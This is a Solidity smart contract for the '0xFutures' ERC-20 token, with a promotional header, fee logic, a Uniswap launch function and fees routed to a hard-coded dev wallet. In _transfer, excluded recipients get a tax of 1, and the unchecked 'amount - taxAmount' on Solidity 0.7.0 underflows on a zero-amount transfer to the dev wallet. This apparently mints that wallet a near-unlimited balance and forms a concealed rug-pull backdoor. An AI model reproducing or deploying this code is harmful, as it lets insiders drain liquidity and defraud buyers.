/**
First-ever zero-day futures trade with a 24-hour time constraint on a Telegram bot. $0xFutures - Building on Etherum Chain (ETH)

Website: https://www.0xfuturetrade.pro
Telegram: https://t.me/future_erc
Twitter: https://twitter.com/future_erc
Dashboard: https://dashboard.0xfuturetrade.pro
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.7.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}
contract ZEROFUTURES is Context, Ownable, IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;

    string private constant _name = "0xFutures";
    string private constant _symbol = "0xFutures";
    uint8 private constant _decimals = 9;
    uint256 private constant _supply = 10 ** 9 * 10**_decimals;

    uint256 private finalBuyFee=1;
    uint256 private finalSellFee=1;
    uint256 private preventSwapBefore=12;
    uint256 private reduceBuyTaxAt=12;
    uint256 private reduceSellTaxAt=12;
    uint256 private initialBuyTax=12;
    uint256 private initialSellTax=12;
    uint256 private buyersCount=0;
    uint256 launchBlock;
    bool private _swapping = false;
    bool private swapEnabled = false;
    IRouter private uniswapRouter;
    address private uniswapPair;
    bool private tradeEnable;
    address payable private devWallet = payable(0xA9c4A755600a1C7D8b2df99A2FC76D70Ae190411);
    uint256 public taxSwapThreshold = 0 * 10**_decimals;
    uint256 public feeAmountToSwap = 1 * 10 ** 7 * 10**_decimals;
    uint256 public maxTxAmount = 25 * 10 ** 6 * 10**_decimals;
    uint256 public maxWalletAmount = 25 * 10 ** 6 * 10**_decimals;


    event MaxTxAmountUpdated(uint maxTxAmount);
    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _balances[_msgSender()] = _supply;
        _isExcluded[owner()] = true;
        _isExcluded[devWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _supply;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function removeLimits() external onlyOwner{
        maxTxAmount = _supply;
        maxWalletAmount=_supply;
        emit MaxTxAmountUpdated(_supply);
    }

    function openTrading() external onlyOwner() {
        require(!tradeEnable,"Trade is already opened");
        uniswapRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouter), _supply);
        uniswapPair = IFactory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        tradeEnable = true;
        launchBlock = block.number;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Transfer from zero address");
        require(to != address(0), "Transfer to zero address");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = _isExcluded[to] ? 1 : amount.mul((buyersCount>reduceBuyTaxAt)?finalBuyFee:initialBuyTax).div(100);
            if (from == uniswapPair && to != address(uniswapRouter) && ! _isExcluded[to] ) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount.");
                require(balanceOf(to) + amount <= maxWalletAmount, "Exceeds the maxWalletAmount.");
                buyersCount++;
            }
            if (to != uniswapPair && ! _isExcluded[to]) {
                require(balanceOf(to) + amount <= maxWalletAmount, "Exceeds the maxWalletAmount.");
            }
            if(to == uniswapPair && from!= address(this) ){
                taxAmount = amount.mul((buyersCount>reduceSellTaxAt)?finalSellFee:initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && to   == uniswapPair && swapEnabled && contractTokenBalance>taxSwapThreshold && buyersCount>preventSwapBefore && !_isExcluded[from]) {
                swapTokensForETH(min(amount,min(contractTokenBalance,feeAmountToSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    devWallet.transfer(address(this).balance);
                }
            }
        }
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
   
    receive() external payable {}
}